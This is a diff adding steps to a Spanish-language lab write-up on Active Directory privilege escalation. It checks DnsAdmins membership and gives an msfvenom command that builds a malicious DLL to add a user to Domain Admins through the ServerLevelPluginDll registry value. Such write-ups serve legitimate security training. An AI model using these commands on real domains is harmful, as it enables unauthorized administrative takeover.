@@ -399,4 +399,18 @@ xfreerdp /v:10.129.11.96 /u:netadm
 
 <img width="1534" height="988" alt="image" src="https://github.com/user-attachments/assets/fca709e9-6252-439a-a693-b48e07394953" />
 
-Abrimos una `powershell` elevada
+Abrimos una `powershell` y verificamos si pertenecemos al grupo `DnsAdmins`:
+```powershell
+Get-ADGroupMember -Identity DnsAdmins
+```
+
+<img width="1015" height="217" alt="image" src="https://github.com/user-attachments/assets/0b3612d7-2dc2-43c2-abce-5716edca3412" />
+
+Al pertenecer al grupo `DnsAdmins` podemos cargar una dll maliciosa en el `ServerLevelPluginDll` del registro para elevar privilegios.
+
+Creamos la dll maliciosa en nuestro host utilizando `msfvenom`:
+```bash
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+
+<img width="1621" height="205" alt="image" src="https://github.com/user-attachments/assets/4d936853-02c6-4711-941d-c03ba9339cc9" />
